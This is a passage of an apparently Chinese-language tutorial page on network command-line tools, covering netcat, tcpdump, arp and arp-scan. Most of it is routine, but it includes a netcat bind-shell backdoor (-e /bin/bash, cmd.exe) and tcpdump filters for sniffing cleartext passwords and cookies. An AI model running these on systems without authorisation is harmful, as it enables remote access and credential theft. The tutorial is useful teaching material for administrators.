</span></span><span class="line"><span class="cl">Server: Apache
</span></span><span class="line"><span class="cl">Last-Modified: Tue, <span class="m">12</span> Jan <span class="m">2010</span> 13:48:00 GMT
</span></span><span class="line"><span class="cl">ETag: <span class="s2">&#34;51-47cf7e6ee8400&#34;</span>
</span></span><span class="line"><span class="cl">Accept-Ranges: bytes
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">81</span>
</span></span><span class="line"><span class="cl">Cache-Control: max-age<span class="o">=</span><span class="m">86400</span>
</span></span><span class="line"><span class="cl">Expires: Tue, <span class="m">29</span> Jun <span class="m">2021</span> 12:16:55 GMT
</span></span><span class="line"><span class="cl">Connection: Close
</span></span><span class="line"><span class="cl">Content-Type: text/html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;html&gt;
</span></span><span class="line"><span class="cl">&lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;refresh&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;0;url=http://www.baidu.com/&#34;</span>&gt;
</span></span><span class="line"><span class="cl">&lt;/html&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="查找端口上运行的服务">查找端口上运行的服务</h3>
<p>使用 <code>netcat</code> 可以获取服务监听端口的信息，单一般情况下，仅常见公共服务会这样，一些服务并不会相应对应的应用名称。。<code>-n</code> 标志表示禁用DNS或服务查找。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -v -n 195.133.11.43 <span class="m">22</span>
</span></span><span class="line"><span class="cl">Ncat: Version 7.50 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
</span></span><span class="line"><span class="cl">Ncat: Connected to 195.133.11.43:22.
</span></span><span class="line"><span class="cl">SSH-2.0-OpenSSH_7.4
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="网络后门-1">网络后门</h3>
<p>一般情况下，黑客将 <code>netcat</code> 当作网络后门来运行，通过反弹式shell以获取远程命令。要充当后门。<code>-e</code>  在目标系统上运行的命令。</p>
<p>如监听一个端口，并将所有传入的输入传递给bash命令，结果将传送于客户端。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># linux
</span></span><span class="line"><span class="cl">nc -l -p -v 3001  -e /bin/bash
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># windows
</span></span><span class="line"><span class="cl">nc -l -p 3001  -e cmd.exe
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="检查一个udp端口">检查一个udp端口</h3>
<p><code>-z</code>：无法进行<code>I/O</code> ，仅报告连接状态</p>
<p><code>-u</code>：使用udp协议</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -vz -u 
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="tcpdump-supa-href11asup">tcpdump <sup><a href="#1">[1]</a></sup></h2>
<p>tcpdump网络嗅探器，将强大和简单结合到一个单一的命令行界面中，能够将网络中的报文抓取，输出到屏幕或者记录到文件中。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian: <code>tcpdump</code> ；<code>apt-get install -y tcpdump</code></li>
<li>CentOS/Fedora: <code>tcpdump</code> ；<code>yum install -y tcpdump</code></li>
<li>Apline：<code>tcpdump </code> ；<code>apk add tcpdump --no-cache</code></li>
</ul>
</blockquote>
<p>查看指定接口上的所有通讯</p>
<p>语法</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-i [interface]  </td>
<td>接口名</td>
</tr>
<tr>
<td>-p</td>
<td><code>--no-promiscuous-mode</code> 抓包内容为非混杂模式下的包</td>
</tr>
<tr>
<td>-w [flle]</td>
<td>保存原始的包到文件中</td>
</tr>
<tr>
<td>-n</td>
<td>不转换IP为DNS名称</td>
</tr>
<tr>
<td>-N</td>
<td>将端口解析为数字格式而不是服务名</td>
</tr>
<tr>
<td>-A</td>
<td>以 <em><strong>ASCII</strong></em> 格式打印内容（不包含标头）</td>
</tr>
<tr>
<td>-XX</td>
<td>打印数据为==数据包的标头==与以十六进制和 <em><strong>ASCII</strong></em> 格式打印数据包的数据。</td>
</tr>
<tr>
<td>-v/-vv/-vvv</td>
<td>详细信息；<code>-v</code>, <code>-vv</code> 将打印更多信息</td>
</tr>
<tr>
<td>-r</td>
<td>读取文件而不是实时抓包</td>
</tr>
</tbody>
</table>
<p><strong>关键字</strong></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>关键字</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>type</strong></td>
<td><code>host</code>, <code>net</code>, <code>port</code>, <code>portrange</code></td>
</tr>
<tr>
<td><strong>direction</strong></td>
<td><code>src</code>, <code>dst</code>, <code>src or dst</code> , <code>src and ds</code></td>
</tr>
<tr>
<td><strong>protocol</strong></td>
<td><code>ether</code>, <code>ip</code>, <code>arp</code>, <code>tcp</code>, <code>udp</code>, <code>wlan</code></td>
</tr>
</tbody>
</table>
<h3 id="捕获所有网络接口">捕获所有网络接口</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump -D
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="按ip查找流量">按IP查找流量</h3>
<p>最常见的查询之一 <code>host</code>，可以看到来往于 <code>1.1.1.1</code> 的流量。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump host 1.1.1.1
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="按源目的-地址过滤">按源/目的 地址过滤</h3>
<p>如果只想查看来自/向某方向流量，可以使用 <code>src</code> 和 <code>dst</code>。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump src<span class="p">|</span>dst 1.1.1.1
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="通过网络查找数据包">通过网络查找数据包</h3>
<p>使用 <code>net</code> 选项，来要查找出/入某个网络或子网的数据包。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump net 1.2.3.0/24
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="使用十六进制输出数据包内容">使用十六进制输出数据包内容</h3>
<p><code>hex</code> 可以以16进制输出包的内容</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump -c <span class="m">1</span> -X icmp
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="查看特定端口的流量">查看特定端口的流量</h3>
<p>使用 <code>port</code> 选项来查找特定的端口流量。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump port <span class="m">3389</span>
</span></span><span class="line"><span class="cl">tcpdump src port <span class="m">1025</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="查找端口范围的流量">查找端口范围的流量</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump portrange 21-23
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="过滤包的大小">过滤包的大小</h3>
<p>如果需要查找特定大小的数据包，可以使用以下选项。你可以使用 <code>less</code>，<code>greater</code>。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump less <span class="m">32</span>
</span></span><span class="line"><span class="cl">tcpdump greater <span class="m">64</span>
</span></span><span class="line"><span class="cl">tcpdump &lt;<span class="o">=</span> <span class="m">128</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="捕获流量输出为文件">捕获流量输出为文件</h3>
<p><code>-w</code>  可以将数据包捕获保存到一个文件中以便将来进行分析。这些文件称为<code>PCAP</code>（PEE-cap）文件，它们可以由不同的工具处理，包括 <code>Wireshark</code> 。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump port <span class="m">80</span> -w capture_file
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="组合条件">组合条件</h3>
<p>tcpdump也可以结合逻辑运算符进行组合条件查询</p>
<ul>
<li>
<p><strong>AND</strong>
<em><code>and</code></em> or <code>&amp;&amp;</code></p>
</li>
<li>
<p><strong>OR</strong>
<em><code>or</code></em> or <code>||</code></p>
</li>
<li>
<p><strong>EXCEPT</strong>
<em><code>not</code></em> or <code>!</code></p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump -i eth0 -nn host 220.181.57.216 and 10.0.0.1  <span class="c1"># 主机之间的通讯</span>
</span></span><span class="line"><span class="cl">tcpdump -i eth0 -nn host 220.181.57.216 or 10.0.0.1
</span></span><span class="line"><span class="cl"><span class="c1"># 获取10.0.0.1与 10.0.0.9或 10.0.0.1 与10.0.0.3之间的通讯</span>
</span></span><span class="line"><span class="cl">tcpdump -i eth0 -nn host 10.0.0.1 and <span class="se">\(</span>10.0.0.9 or 10.0.0.3<span class="se">\)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="原始输出">原始输出</h3>
<p>并显示人类可读的内容进行输出包（不包含内容）。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tcpdump -ttnnvvS -i eth0 
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="ip到端口">IP到端口</h3>
<p>让我们查找从某个IP到端口任何主机的某个端口所有流量。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump -nnvvS src 10.5.2.3 and dst port <span class="m">3389</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="去除特定流量">去除特定流量</h3>
<p>可以将指定的流量排除，如这显示所有到192.168.0.2的 非ICMP的流量。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump dst 192.168.0.2 and src net and not icmp
</span></span></code></pre></td></tr></table>
</div>
</div><p>来自非指定端口的流量，如，显示来自不是SSH流量的主机的所有流量。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump -vv src mars and not dst port <span class="m">22</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="选项分组">选项分组</h3>
<p>在构建复杂查询时，必须使用单引号 <code>'</code>。单引号用于忽略特殊符号 <code>()</code> ，以便于使用其他表达式（如host, port, net等）进行分组。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tcpdump &#39;src 10.0.2.4 and (dst port 3389 or 22)&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="过滤tcp标记位">过滤TCP标记位</h3>
<p>TCP RST</p>
<p>The filters below find these various packets because tcp[13] looks at offset 13 in the TCP header, the number represents the location within the byte, and the !=0 means that the flag in question is set to 1, i.e. it’s on.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump <span class="s1">&#39;tcp[13] &amp; 4!=0&#39;</span>
</span></span><span class="line"><span class="cl">tcpdump <span class="s1">&#39;tcp[tcpflags] == tcp-rst&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>TCP SYN</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump <span class="s1">&#39;tcp[13] &amp; 2!=0&#39;</span>
</span></span><span class="line"><span class="cl">tcpdump <span class="s1">&#39;tcp[tcpflags] == tcp-syn&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>同时忽略SYN和ACK标志的数据包</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump <span class="s1">&#39;tcp[13]=18&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>TCP URG</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump <span class="s1">&#39;tcp[13] &amp; 32!=0&#39;</span>
</span></span><span class="line"><span class="cl">tcpdump <span class="s1">&#39;tcp[tcpflags] == tcp-urg&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>TCP ACK</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump <span class="s1">&#39;tcp[13] &amp; 16!=0&#39;</span>
</span></span><span class="line"><span class="cl">tcpdump <span class="s1">&#39;tcp[tcpflags] == tcp-ack&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>TCP PSH</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump <span class="s1">&#39;tcp[13] &amp; 8!=0&#39;</span>
</span></span><span class="line"><span class="cl">tcpdump <span class="s1">&#39;tcp[tcpflags] == tcp-push&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>TCP FIN</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump <span class="s1">&#39;tcp[13] &amp; 1!=0&#39;</span>
</span></span><span class="line"><span class="cl">tcpdump <span class="s1">&#39;tcp[tcpflags] == tcp-fin&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="查找http包">查找http包</h3>
<p>查找 <code>user-agent</code> 信息</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump -vvAls0 <span class="p">|</span> grep <span class="s1">&#39;User-Agent:&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>查找只是 <code>GET</code> 请求的流量</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump -vvAls0 <span class="p">|</span> grep <span class="s1">&#39;GET&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>查找http客户端IP</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump -vvAls0 <span class="p">|</span> grep <span class="s1">&#39;Host:&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>查询客户端cookie</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump -vvAls0 <span class="p">|</span> grep <span class="s1">&#39;Set-Cookie|Host:|Cookie:&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="查找dns流量">查找DNS流量</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump -vvAs0 port <span class="m">53</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="查找对应流量的明文密码">查找对应流量的明文密码</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcpdump port http or port ftp or port smtp or port imap or port pop3 or port telnet -lA <span class="p">|</span> egrep -i -B5 <span class="s1">&#39;pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd= |password=|pass:|user:|username:|password:|login:|pass |user &#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="arp">arp</h3>
<p>ARP “地址解析协议” (<code>Address Resolution Protoco</code>)，是一种将IP地址映射到局域网上物理MAC地址的协议。</p>
<p><strong>为什么我们需要MAC地址？</strong></p>
<p>任何本地通信都将使用MAC地址，而不是IP地址。当一台计算机想在不同的网络上与另一台计算机通信时，将使用IP地址。IP地址就像你的邮寄收货地址，而MAC地址就像你的名字。在TCP/IP网络上，每台计算机都被分配IP地址，一些本地服务器的IP地址也被分配给网络客户主机。因此其在第2层（数据链路层）和第3层（网络层）之间工作。</p>
<p>在一个本地网络中，客户主机尝试在连接另外一个主机时（这里为同一网络，即同一广播域中），首先客户端会检查ARP缓存表（缓存IP于MAC的关系）。而 <code>arp</code> 命令可以管理系统的arp缓存表。它允许完全转储ARP缓存。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian:  <code>net-tools</code>   ；<code>apt install net-tools</code></li>
<li>CentOS/Fedora: <code>net-tools</code>  ；<code>yum install -y net-tools</code></li>
<li>Apline：<code>net-tools</code> ；<code>apk add --no-cache net-tools</code></li>
</ul>
</blockquote>
<h3 id="查看arp条目">查看arp条目</h3>
<p><code>arp</code> 命令在没有任何选项的情况下将显示arp缓存表的内容。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">arp
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Address                  HWtype  HWaddress           Flags Mask            Iface
</span></span><span class="line"><span class="cl">correspond.fsddsfk.cn    ether   c4:71:fe:f1:9f:3f   C                     eth0
</span></span><span class="line"><span class="cl">gateway                  ether   00:1f:ce:72:bd:8c   C                     eth0
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="显示一个特定的arp条目">显示一个特定的arp条目</h3>
<p>当arp缓存表很大不利于查看，并且仅需要拿到特定IP的条目的话，可以在 <code>-a</code> 后加具体IP地址来获取一个特定的条目。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">arp -a 46.17.40.155
</span></span><span class="line"><span class="cl">correspond.faaaaa.cn <span class="o">(</span>10.17.40.1<span class="o">)</span> at c4:71:fe:f1:9f:3f <span class="o">[</span>ether<span class="o">]</span> on eth0
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="显示指定接口的arp缓存表">显示指定接口的arp缓存表</h3>
<p>如果仅希望显示一个接口的arp条目，可以通过 <code>arp</code> 命令 <code>-i</code>选项后跟接口名称。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">arp -i bond0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Address                HWtype  HWaddress           Flags Mask            Iface
</span></span><span class="line"><span class="cl">usartdb02.exmpl.c      ether   17:a9:9b:f5:1a:7e   C                     bond0
</span></span><span class="line"><span class="cl">usartdb02.exmpl.c      ether   f8:db:77:f2:5a:a2   C                     bond0
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="删除一个arp条目">删除一个arp条目</h3>
<p>从arp缓存表中删除一个ip条目，可以使用 <code>arp</code> 命令-d选项，后跟IP地址。当一旦执行arp命令，ARP缓存表就会被刷新。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">arp -d 192.168.188.2
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="向arp缓存添加一个条目">向arp缓存添加一个条目</h3>
<p>永久添加一个条目到arp缓存中，使用 <code>-s</code> 选项，需要指定IP地址和MAC地址外，还需要指定将条目添加到哪个接口。如：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">arp -s 192.168.188.133 -i eth0 00:0c:29:f6:1d:81
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="清空arp缓存表">清空arp缓存表</h3>
<p>某些场景下，需要清空arp缓存，而 <code>arp</code> 命令并没有清空缓存表的操作，这时可以使用 <code>ip neigh</code>   而且<code>ip-route2</code> 最小化安装；基础容器等场景下也会存在。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ip neigh flush dev eth0s
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="显示格式">显示格式</h3>
<p>使用 <code>-e</code> 选项以linux标准格式输出arp缓存表</p>
<p>其输出格式中，ARP缓存表中的每个完整条目都将被标记为 <code>C</code> Complete entry。<code>M</code> （Permanent entry）表示永久条目；<code>P</code> （Published entry.）表示已发布条目标记。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">arp -ae
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Address                  HWtype  HWaddress           Flags Mask            Iface
</span></span><span class="line"><span class="cl">correspond.fsddsfk.cn    ether   c4:71:fe:fe:9f:2f   C                     eth0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">arp -aen
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Address                  HWtype  HWaddress           Flags Mask            Iface
</span></span><span class="line"><span class="cl">36.17.40.111             ether   c4:71:fe:fe:9f:2f   C                     eth0
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="arp-scan">arp-scan</h2>
<p>网络扫描是渗透测试的步骤之一。有不同的和流行的工具来扫描网络线masscan，nmap等。Arp扫描。</p>
<p><code>arp-scan</code> 是专门设计用来扫描二层（网络层）的mac, arp数据包的工具（也可称为<code>ARP Sweep</code> 或 <code>MAC Scanner</code> ）；是一个非常快速的ARP包扫描程序，它可以显示子网中所有活动的IPv4设备。由于ARP是不可路由的，这种类型的扫描仪只能在本地LAN（本地子网或网段）上工作。</p>
<p><code>arp-scan</code> 显示所有活动设备，即使它们有防火墙。设备不能像躲避Ping一样躲避ARP包。</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian:  <code>arp-scan</code>   ；<code>apt install arp-scan</code></li>
<li>CentOS/Fedora: <code>arp-scan</code> (epel)  ；<code>yum install -y arp-scan</code></li>
<li>Apline：<code>arp-scan</code> ；<code>apk add --no-cache arp-scan</code></li>
</ul>
</blockquote>
<h3 id="扫描本地网络">扫描本地网络</h3>
<p><code>arp-scan</code> 的最基本使用方法是扫描本地网络，使用<code>-l</code> 或 <code>--localnet</code> 可以扫描整个本地网络，但需要root权限</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">arp-scan  --localnet
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Interface: eth0, type: EN10MB, MAC: da:78:c8:7a:fb:26, IPv4: 195.133.11.43
</span></span><span class="line"><span class="cl">Starting arp-scan 1.9.7 with <span class="m">512</span> hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
